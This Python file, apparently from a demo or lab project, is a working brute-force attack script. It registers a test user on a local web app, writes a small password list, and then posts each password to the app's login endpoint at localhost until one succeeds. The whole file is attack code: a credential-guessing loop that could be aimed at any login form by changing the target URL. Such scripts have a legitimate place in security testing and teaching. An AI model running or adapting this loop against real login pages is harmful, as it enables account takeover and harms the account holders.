# exploit-scripts/brute_force.py
import requests
import json

TARGET_URL = "http://localhost:8080/login"

def attempt_brute_force(username, password_list_file):
    print(f"[*] Starting brute-force attack on user: {username}")

    try:
        with open(password_list_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[!] Error: Password file not found at '{password_list_file}'")
        return

    for password in passwords:
        payload = {
            "username": username,
            "password": password
        }
        headers = {'Content-Type': 'application/json'}

        print(f"  [-] Trying password: {password}")

        response = requests.post(TARGET_URL, data=json.dumps(payload), headers=headers)

        # Check for a successful login message
        if response.status_code == 200 and "Login Successful" in response.text:
            print(f"\n[+] SUCCESS! Password found for '{username}': {password}\n")
            return password

    print(f"\n[-] Attack finished. Password not found in the list for '{username}'.")
    return None

if __name__ == "__main__":
    # Create a dummy password file
    with open("passwords.txt", "w") as f:
        f.write("12345\n")
        f.write("password\n")
        f.write("admin123\n") # Let's assume this is the correct one
        f.write("qwerty\n")

    # First, register a user to attack
    register_payload = {"username": "testuser", "password": "admin123"}
    requests.post("http://localhost:8080/register", json=register_payload)
    print("[*] Registered user 'testuser' with password 'admin123'")

    # Now, launch the attack
    attempt_brute_force("testuser", "passwords.txt")